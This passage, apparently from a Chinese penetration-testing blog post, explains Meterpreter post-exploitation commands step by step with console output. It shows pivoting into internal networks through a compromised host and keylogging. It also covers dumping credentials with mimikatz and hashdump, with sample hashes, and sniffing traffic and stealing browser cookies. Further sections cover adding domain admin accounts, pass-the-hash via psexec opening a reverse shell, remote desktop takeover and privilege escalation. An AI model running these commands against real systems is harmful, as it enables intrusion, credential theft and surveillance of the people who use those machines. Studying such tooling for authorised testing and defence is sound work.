<p><span lang="EN-US"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025506778-1694584941.gif" alt="enter image description here" width="554" height="223"></span></p>
<p>在建立规则之后就可以连接本地3344端口，这样远程的<span lang="EN-US&gt;">3389</span>端口就转发出来了。</p>
<p>(2)route</p>
<p>使用route命令可以借助meterpreter会话进一步<span lang="EN-US&gt;">msf</span>渗透内网，我们已经拿下并产生meterpreter反弹会话的主机可能出于内网之中，外有一层<span lang="EN-US&gt;">NAT</span>，我们无法直接向其内网中其他主机发起攻击，则可以借助已产生的meterpreter会话作为路由跳板，攻击内网其它主机。</p>
<p>可以先使用run&nbsp;get_local_subnets命令查看已拿下的目标主机的内网<span lang="EN-US&gt;">IP</span>段情况</p>
<p>命令：run&nbsp; get_local_subnets</p>
<p>如下图：</p>
<p><span lang="EN-US"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025507058-643543622.gif" alt="" width="428" height="67"></span></p>
<p>其内网有192.168.249.0/24网段，我们无法直接访问</p>
<p>下面做一条路由，下一跳为当前拿下主机的sessionid（目前为<span lang="EN-US&gt;">5</span>），即所有对249网段的攻击流量都通过已渗透的这台目标主机的<span lang="EN-US&gt;">meterpreter</span>会话来传递。</p>
<p>命令：route add&nbsp; 192.168.249.0
255.255.255.0 5</p>
<p>再使用route print查看一下路由表，效果如下图：</p>
<p><span lang="EN-US"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025507697-727487729.gif" alt="" width="638" height="189"></span><br>最后我们就可以通过这条路由，以当前拿下的主机<span lang="EN-US&gt;">meterpreter</span>作为路由跳板攻击249网段中另一台有<span lang="EN-US&gt;">ms08-067</span>漏洞的主机，获得反弹会话成功顺利拿下了另一台内网主机192.168.249.1，如下图：</p>
<p><span lang="EN-US"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025508705-1158483190.gif" alt="" width="643" height="443"></span></p>
<p>大多时候我们获取到的meterpreter
shell处于内网，而我们需要代理到目标内网环境中，扫描其内网服务器。这时可以使用route功能，添加一条通向目标服务器内网的路由。</p>
<p>查看shell网络环境：</p>
<p>meterpreter&gt;run
get_local_subnets</p>
<p>添加一条通向目标服务器内网的路由</p>
<p>meterpreter&gt;run&nbsp;autoroute&nbsp;-s&nbsp;100.0.0.0/8
&nbsp;&nbsp;#(根据目标内网网络而定<span lang="EN-US&gt;">)</span></p>
<p>查看路由设置：</p>
<p>meterpreter&gt;run autoroute –p</p>
<p>一般来说，在meterpreter中设置路由便可以达到通往其内网的目的。然而有些时候还是会失败，这时我们可以<span lang="EN-US&gt;">background</span>返回msf&gt;，查看下外面的路由情况。</p>
<p>route print</p>
<p>如果发现没有路由信息，说明meterpreter
shell设置的路由并没有生效，我们可以在msf中添加路由。</p>
<p>msf&gt;route add 10.0.0.0
255.0.0.0 1</p>
<p>说明：1表示<span lang="EN-US&gt;">session 1</span>，攻击机如果要去访问10.0.0.0/8网段的资源，其下一跳是<span lang="EN-US&gt;">session1</span>，至于什么是下一条这里不多说了，反正就是目前攻击机可以访问内网资源了。</p>
<p>&nbsp;</p>
<p><span lang="EN-US">4.</span>键盘监听</p>
<p>Meterpreter还可以在目标设备上实现键盘记录功能，键盘记录主要涉及以下三种命令：</p>
<p>keyscan_start：开启键盘记录功能</p>
<p>keyscan_dump：显示捕捉到的键盘记录信息</p>
<p>keyscan_stop：停止键盘记录功能</p>
<div>
<p>uictl enable keyboard/mouse#接管目标主机的键盘和鼠标。</p>
<p>meterpreter &gt; keyscan_start #针对远程目标主机开启键盘记录功能</p>
<p>Starting the keystroke sniffer...</p>
<p>meterpreter &gt; keyscan_dump #存储目标主机上捕获的键盘记录</p>
<p>Dumping captured keystrokes...</p>
<p>dir &lt;Return&gt; cd&lt;Ctrl&gt;&nbsp; &lt;LCtrl&gt;</p>
<p>meterpreter &gt; keyscan_stop #停止针对目标主机的键盘记录</p>
<p>Stopping the keystroke sniffer...</p>
<p>&nbsp;</p>

</div>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025509266-2015215398.gif" alt="enter image description here" width="554" height="137"></p>
<p>这里需要注意一下<span lang="EN-US&gt;">windows</span>会话窗口的概念，windows桌面划分为不同的会话<span lang="EN-US&gt;">(session)</span>，以便于与windows交互。会话<span lang="EN-US&gt;">0</span>代表控制台，1，2代表远程桌面。所以要截获键盘输入必须在<span lang="EN-US&gt;">0</span>中进行。可以使用getdesktop查看或者截张图试试。否则使用<span lang="EN-US&gt;">setdesktop</span>切换。</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025509918-1993120500.gif" alt="enter image description here" width="554" height="281"></p>
<p>如果不行就切换到<span lang="EN-US&gt;">explorer.exe</span>进程中，这样也可以监听到远程桌面连接进来之后的键盘输入数据。</p>
<p>&nbsp;</p>
<p><span lang="EN-US">5.</span>系统命令</p>
<div>
<p>reboot#重新启动受害人的计算机</p>
<p>reg#与受害人的注册表进行交互</p>
<p>rev2self#回到控制目标主机的初始用户账户下</p>
<p>shell#获得控制台权限</p>
<p>shutdown#关闭了受害者的计算机</p>
<p>sysinfo # 查看目标机系统信息，如机器名，操作系统等</p>
<p>add_user username password -h ip&nbsp;&nbsp;&nbsp; #在远程目标主机上添加一个用户</p>
<p>add_group_user "Domain Admins" username -h
ip&nbsp;&nbsp;&nbsp; #将用户添加到目标主机的域管理员组中</p>

</div>
<p>shell命令</p>
<p>获取目标主机的远程命令行<span lang="EN-US&gt;">shell,</span>如果出错，考虑是目标主机限制了cmd.exe的访问权，可以使用<span lang="EN-US&gt;">migrate</span>注入到管理员用户进程中再尝试</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025510277-994919012.gif" alt="" width="325" height="123"></p>
<p><span lang="EN-US">6.mimikatz</span></p>
<div>
<p>meterpreter &gt; load mimikatz&nbsp; #加载<span lang="EN-US">mimikatz</span></p>
<p>meterpreter &gt; msv #获取<span lang="EN-US">hash</span>值</p>
<p>meterpreter &gt; kerberos #获取明文</p>
<p>meterpreter &gt;ssp &nbsp;&nbsp;#获取明文信息</p>
<p>meterpreter &gt; wdigest #获取系统账户信息</p>
<p>meterpreter &gt;mimikatz_command -f a:: &nbsp;&nbsp;#必须要以错误的模块来让正确的模块显示</p>
<p>meterpreter &gt;mimikatz_command -f hash:: &nbsp;&nbsp;#获取目标<span lang="EN-US"> hash</span></p>
<p>meterpreter &gt; mimikatz_command -f samdump::hashes</p>
<p>meterpreter &gt; mimikatz_command -f
sekurlsa::searchPasswords</p>
<p>&nbsp;</p>

</div>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025511190-1101646215.gif" alt="这里写图片描述" width="553" height="431"></p>
<p><span lang="EN-US">7.</span>网络嗅探</p>
<div>
<p>meterpreter &gt; use sniffer # 加载嗅探模块</p>
<p>Loading extension sniffer...success.</p>
<p>meterpreter &gt; sniffer_interfaces #列出目标主机所有开放的网络接口</p>
<p>&nbsp;&nbsp;&nbsp; 1 - 'WAN
Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false
)</p>
<p>&nbsp;&nbsp;&nbsp; 2 - 'Intel(R)
PRO/1000 MT Desktop Adapter' ( type:0 mtu:1514 usable:true dhcp:true wifi:false
)</p>
<p>&nbsp;&nbsp;&nbsp; 3 - 'Cisco
Systems VPN Adapter' ( type:4294967295 mtu:0 usable:false dhcp:false wifi:false
)</p>
<p>meterpreter &gt; sniffer_start 2 #获取正在实施嗅探网络接口的统计数据</p>
<p>[*] Capture started on interface 2 (50000 packet buffer)</p>
<p>meterpreter &gt; sniffer_dump 2 /tmp/test2.cap #在目标主机上针对特定范围的数据包缓冲区启动嗅探</p>
<p>[*] Flushing packet capture buffer for interface 2...</p>
<p>[*] Flushed 1176 packets (443692 bytes)</p>
<p>[*] Downloaded 100% (443692/443692)...</p>
<p>[*] Download completed, converting to PCAP...</p>
<p>[*] PCAP file written to /tmp/test2.cap</p>
<p>meterpreter &gt; sniffer_stop &nbsp;2&nbsp;&nbsp; #停止嗅探</p>

</div>
<p>Metasploit包含<span lang="EN-US&gt;">sniffer</span>脚本。Meterpreter的这个模块可以用来做数据包捕获<span lang="EN-US&gt;">,</span>不需要在远程机器上安装任何软件：</p>
<p>首先执行<span lang="EN-US&gt;">use sniffer</span>命令作用为使用嗅探脚本。</p>
<p><a href="http://blog.51cto.com/attachment/201301/204140136.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025511495-1651005392.gif" alt="" width="399" height="40" border="0"></a></p>
<p>sniffer_interfaces命令为获取网卡的信息，得到我们的<span lang="EN-US&gt;">ID</span>为1.</p>
<p><a href="http://blog.51cto.com/attachment/201301/204202437.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025511796-2111730296.gif" alt="" width="598" height="97" border="0"></a></p>
<p>sniffer_start ID命令开始嗅探。</p>
<p><a href="http://blog.51cto.com/attachment/201301/204225145.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025512050-371694922.gif" alt="" width="505" height="51" border="0"></a></p>
<p>sniffer_dump ID filepath保存抓取的数据包，本例中/tmp/1.cap是抓取数据包的保存路径。</p>
<p><a href="http://blog.51cto.com/attachment/201301/204239957.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025512367-855393732.gif" alt="" width="542" height="93" border="0"></a></p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025513190-934557375.gif" alt="这里写图片描述" width="554" height="296"></p>
<p>对抓取的包进行解包：</p>
<p>use auxiliary/sniffer/psnuffle</p>
<p>set pcapfile 1.cap</p>
<p>run</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025513723-1556150866.gif" alt="20161006153844" width="554" height="204"></p>
<p>然后在shell中中输入：wireshark，加载这个<span lang="EN-US&gt;">/tmp/xpsp1.cap</span>包即可：</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025514240-2008527548.gif" alt="" width="554" height="175"></p>
<p><span lang="EN-US">8.</span>获取敏感信息</p>
<div>
<p>run post/windows/gather/checkvm #是否虚拟机</p>
<p>run post/windows/gather/enum_applications #获取安装软件信息</p>
<p>run post/windows/gather/dumplinks&nbsp;&nbsp; #获取最近的文件操作</p>
<p>run post/windows/gather/enum_ie&nbsp; #获取<span lang="EN-US">IE</span>缓存</p>
<p>run post/windows/gather/enum_chrome&nbsp;&nbsp; #获取<span lang="EN-US">Chrome</span>缓存</p>
<p>run 
scraper&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 #获取常见信息</p>
<p>#保存在～/.msf4/logs/scripts/scraper/目录下</p>

</div>
<p>(1)post/windows/gather/enum_application模块获取目标主机上的软件安装信息</p>
<p>命令：<span lang="EN-US&gt;">run&nbsp;post/windows/gather/enum_applications</span></p>
<p>效果如图：</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025514944-395995266.gif" alt="" width="643" height="417"></p>
<p>(2) post/windows/gather/enum_ie后渗透模块，读取目标主机<span lang="EN-US&gt;">IE</span>浏览器cookies等缓存信息，嗅探目标主机登录过的各类账号密码</p>
<p>命令：<span lang="EN-US&gt;">run&nbsp; post/windows/gather/enum_ie</span></p>
<p>效果如下图：</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025515806-426283986.gif" alt="" width="646" height="378"></p>
<p>获取到的目标主机上的<span lang="EN-US&gt;">ie</span>浏览器缓存历史记录和cookies信息等都保存到了攻击主机本地的<span lang="EN-US&gt;">/root/.msf5/loot/</span>目录下,这里说IE7以上才有效</p>
<p><span lang="EN-US">9.</span>获取<span lang="EN-US&gt;">Hash</span></p>
<p>使用“hashdump”命令可以从系统提取用户名和密码<span lang="EN-US&gt;">hashes</span>。使用hashdump命令可以获取目标主机的<span lang="EN-US&gt;">SAM</span>文件，获取目标主机的账号密码hash信息，剩下的可以用爆破软件算出明文密码，微软一般用<span lang="EN-US&gt;">LM,NTML</span>和NTLMv2形式的哈希表存储密码。若想运行这个命令<span lang="EN-US&gt;">,&nbsp;</span>需要有注册表和SAM [Security Account Manager]的系统的权限，如果你是作为一个普通的用户登陆的话，你需要提升权限<span lang="EN-US&gt;">,</span>这我们将在后面提到。</p>
<div>
<p>meterpreter &gt; run post/windows/gather/smart_hashdump</p>
<p>[*] Running module against TESTING</p>
<p>[*] Hashes will be saved to the database if one is
connected.</p>
<p>[*] Hashes will be saved in loot in JtR password file
format to:</p>
<p>[*]
/home/croxy/.msf4/loot/20150929225044_default_10.0.2.15_windows.hashes_407551.txt</p>
<p>[*] Dumping password hashes...</p>
<p>[*] Running as SYSTEM extracting hashes from registry</p>
<p>[*]&nbsp;&nbsp;&nbsp;&nbsp; Obtaining
the boot key...</p>
<p>[*]&nbsp;&nbsp;&nbsp;&nbsp; Calculating
the hboot key using SYSKEY 8c2c8d96e92a8ccfc407a1ca48531239...</p>
<p>[*]&nbsp;&nbsp;&nbsp;&nbsp; Obtaining
the user list and keys...</p>
<p>[*]&nbsp;&nbsp;&nbsp;&nbsp; Decrypting
user keys...</p>
<p>[*]&nbsp;&nbsp;&nbsp;&nbsp; Dumping
password hints...</p>
<p>[+]Croxy:"Whoareyou"</p>
<p>[*]&nbsp;&nbsp;&nbsp;&nbsp; Dumping
password hashes...</p>
<p>[+]Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::&nbsp; </p>
<p>[+]HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:e3f0347f8b369cac49e62a18e34834c0:::</p>
<p>[+]test123:1003:aad3b435b51404eeaad3b435b51404ee:0687211d2894295829686a18ae83c56d:::</p>

</div>
<p>脚本和post模块都需要通过“run”命令执行，我在测试环境中运行<span lang="EN-US&gt;">hashdump</span>模块后的结果如下：</p>
<p>&nbsp;</p>
<p><a href="http://image.3001.net/images/20171121/1511265684404.png" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025516450-1270381337.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="554" height="211" border="0"></a></p>
<p>数据的输出格式为：用户名：SID：<span lang="EN-US&gt;">LM</span>哈希：NTLM哈希:::，所以我们得到了三个用户账号，分别为<span lang="EN-US&gt;">Administrator, Guest</span>和Coen。</p>
<p>其中的<a href="https://en.wikipedia.org/wiki/LAN_Manager">LM</a>哈希（aad3b435b51404eeaad3b435b51404ee）跟<span lang="EN-US&gt;"><a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NTLM</a></span>哈希（31d6cfe0d16ae931b73c59d7e0c089c0）对应的是一个空密码。</p>
<p>接下来要处理的就是用户Coen的密码（<span lang="EN-US&gt;">f773c5db7ddebefa4b0dae7ee8c50aea</span>）了。虽然我们可以使用类似<span lang="EN-US&gt;"><a href="http://www.openwall.com/john/">John the Ripper</a></span>这样的工具来破解密码，但是我们直接<a href="https://www.google.nl/search?q=f773c5db7ddebefa4b0dae7ee8c50aea">Google</a>这个哈希之后，就直接得到了<span lang="EN-US&gt;"><a href="https://www.troyhunt.com/bad-passwords-are-not-fun-and-good/"><span lang="EN-US">密码明文</span></a></span>：<a href="https://en.wikipedia.org/wiki/Trust_No_1">trustno1</a>。</p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/204616787.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025516974-1056262125.gif" alt="" width="612" height="128" border="0"></a></p>
<p>use post/windows/gather/hashdump</p>
<p>set session 4</p>
<p>run</p>
<p><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025517654-691429501.gif" alt="20161006155822" width="554" height="305"></p>
<ol>
<li>检查已有权限+系统类型&nbsp;&nbsp;</li>
<li>检查是否为域控制器&nbsp;&nbsp;</li>
<li>从注册表读hash，若失败，注入LSASS进程；若域控制器，直接注入LSASS进程&nbsp;&nbsp;</li>
<li>若win2008+会话管理员权限，尝试使用getsystem，若在system不能注入LSASS，先migrate到system权限下的进程，继续注入LSASS&nbsp;&nbsp;</li>
<li>若win7/Vista+UAC关闭+会话管理员权限，尝试getsystem，读取hash&nbsp;&nbsp;</li>
<li>若win2003/xp/2000，直接getsystem，读取hash&nbsp;&nbsp;</li>

</ol>
<p>&nbsp;</p>
<p><span lang="EN-US">10.</span>通过Hash获取权限</p>
<div>
<p>msf &gt; use exploit/windows/smb/psexec</p>
<p>msf exploit(psexec) &gt; show options&nbsp;&nbsp;&nbsp; </p>
<p>&nbsp;</p>
<p>Module options (exploit/windows/smb/psexec):&nbsp;&nbsp;&nbsp; </p>
<p>&nbsp;</p>
<p>Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Current
Setting&nbsp; Required&nbsp; Description</p>
<p>-------------------&nbsp; --------&nbsp; -----------</p>
<p>RHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The target address</p>
<p>RPORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Set the SMB service port</p>
<p>SHAREADMIN$&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The share to connect to, can be
 an
admi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;n 
share</p>
<p>&nbsp;</p>
<p>(ADMIN$,C$,...) or a normal read/write folder share</p>
<p>SMBDomainWORKGROUP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The Windows domain to use 
for
authentication</p>
<p>SMBPass&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The password for the 
specified username</p>
<p>SMBUser&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
 no&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The username to 
authenticate as&nbsp;&nbsp;&nbsp; </p>
<p>&nbsp;</p>
<p>Exploit target:&nbsp;&nbsp;&nbsp; </p>
<p>&nbsp;</p>
<p>Id&nbsp; Name</p>
<p>--&nbsp; ----</p>
<p>0&nbsp;&nbsp; Automatic&nbsp;&nbsp;&nbsp; </p>
<p>&nbsp;</p>
<p>msf exploit(psexec) &gt; set RHOST 192.168.0.254</p>
<p>RHOST =&gt; 192.168.0.254</p>
<p>msf exploit(psexec) &gt; set SMBUser isosky</p>
<p>SMBUser =&gt; isosky</p>
<p>msf exploit(psexec) &gt; set SMBPass
01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537&nbsp;&nbsp;&nbsp; </p>
<p>&nbsp;</p>
<p>SMBPass =&gt;
01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537</p>
<p>msf exploit(psexec) &gt; exploit</p>
<p>[*] Started reverse handler on 192.168.0.3:4444</p>
<p>[*] Connecting to the server...</p>
<p>[*] Authenticating to 192.168.0.254:445|WORKGROUP as user
'isosky'...</p>
<p>[*] Uploading payload...</p>
<p>[*] Created \UGdecsam.exe...</p>
<p>[*] Binding to
367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.254[\svcctl] ...</p>
<p>[*] Bound to
367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.0.254[\svcctl] ...</p>
<p>[*] Obtaining a service manager handle...</p>
<p>[*] Creating a new service (MZsCnzjn -
"MrZdoQwIlbBIYZQJyumxYX")...</p>
<p>[*] Closing service handle...</p>
<p>[*] Opening service...</p>
<p>[*] Starting the service...</p>
<p>[*] Removing the service...</p>
<p>[*] Closing service handle...</p>
<p>[*] Deleting \UGdecsam.exe...</p>
<p>[*] Sending stage (749056 bytes) to 192.168.0.254</p>
<p>[*] Meterpreter session 1 opened (192.168.0.3:4444 -&gt; 192.168.0.254:1877)
at 2011-07-19 03:57:17 +0800</p>

</div>
<p><span lang="EN-US">11.</span>捕捉屏幕</p>
<p>要想查看到远程机器当前的桌面信息，可以使用“screenshot”命令，可以看到，此命令不仅把对方的桌面给显示了出来而且把桌面作为图片形式保存在了本地。我们通过桌面的信息可以知道一些对我们入侵有帮助的信息，比如对方的杀毒软件的类型等等。</p>
<p>我们可以使用“<span lang="EN-US&gt;">screenshot</span>”命令来进行屏幕截图并存储在我们的系统之中。<a href="http://image.3001.net/images/20171121/15112657653426.png" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025518221-1816826509.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="554" height="104" border="0"></a></p>
<p>截取的效果如下所示：</p>
<p><a href="http://image.3001.net/images/20171121/15112657949698.png" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025518984-1976979685.gif" alt="手把手教你如何利用Meterpreter渗透Windows系统" width="554" height="309" border="0"></a></p>
<p><span lang="EN-US">12.</span>得到远程桌面</p>
<p>使用命令“run vnc”将会弹出窗口，在此窗口中就是对方现在打开的桌面情况，在这里，可以对远程机器进行操控。</p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/205037995.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025519778-1891004820.gif" alt="" width="606" height="310" border="0"></a></p>
<p>&nbsp;</p>
<p><a href="http://blog.51cto.com/attachment/201301/205054689.jpg" target="_blank"><img src="Meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%20-%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E5%BF%83%20-%20%E5%8D%9A%E5%AE%A2%E5%9B%AD_files/1049983-20180816025520662-740761989.gif" alt="" width="592" height="451" border="0"></a></p>
<p>&nbsp;</p>
<p><span lang="EN-US">13.</span>权限提升</p>
<p>这是meterpreter中实施漏洞利用系统特权要求的一个重要的模块。为了这个目的<span lang="EN-US&gt;">,</span>我们必须用PRIV extention.，在旧版本的<span lang="EN-US&gt;">Metasploit</span>中Priv extension并不自动装载，使用“<span lang="EN-US&gt;">use priv”</span>手动加载的。然而在后来的msf版本中并不需要担心这一点。</p>
<p>使用“<span lang="EN-US&gt;">getuid</span>”获得当前的权限，migrate+PID迁移进程（当我们攻击一个系统是，常常是对像是<span lang="EN-US&gt;">IE</span>之类的服务漏洞进行利用的，可是不免有对方关闭IE的情况，那么我们的<span lang="EN-US&gt;">meterpreter</span>会话将会关闭，从而导致与目标系统失去连接，所以我们可以使用迁移进程后的攻击模块，将<span lang="EN-US&gt;">sessions</span>迁移到内存空间中的其他稳定的、不会被关闭的服务进程中，以维持稳定的系统控制），从列表中看到<span lang="EN-US&gt;">PID</span>为500的是administrator权限，所以是迁移到<span lang="EN-US&gt;">administrator</span>的权限，“getsystem –h”升级为权限<span lang="EN-US&gt;">SYSTEM</span>账户。这个模块可以用来提升我们的特权，有四个技巧。Meterpreter自动检查四个方法并且尝试其最好方法。然后看到我们权限又变为了<span lang="EN-US&gt;">system</span>权限了。</p>
<div>
